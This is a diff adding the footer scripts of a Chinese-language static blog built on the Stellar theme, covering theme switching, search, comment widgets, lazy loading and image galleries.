+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js`,
+    marked: `https://cdn.jsdelivr.net/npm/marked@13.0.1/lib/marked.umd.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+
+<!-- required -->
+<script src="/js/main.js?v=1.29.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    applyThemeToGiscus(theme)
+  }
+
+  const applyThemeToGiscus = (theme) => {
+    theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    }
+  })()
+</script>
+
+
+<!-- optional -->
+
+  <script type="module">
+  const el = document.querySelector('#comments #beaudar');
+  util.viewportLazyload(el, load_beaudar, false);
+
+  function load_beaudar() {
+    if (!el) return;
+    try {
+      el.innerHTML = '';
+    } catch (error) {
+      console.error(error);
+    }
+    const script = document.createElement('script');
+    script.src = 'https://beaudar.lipk.org/client.js';
+    script.async = true;
+    for (const key of Object.keys(el.attributes)) {
+      const attr = el.attributes[key];
+      if (['class', 'id'].includes(attr.name) === false) {
+        script.setAttribute(attr.name, attr.value);
+      }
+    }
+    el.appendChild(script);
+  }
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          rewind: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script>
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
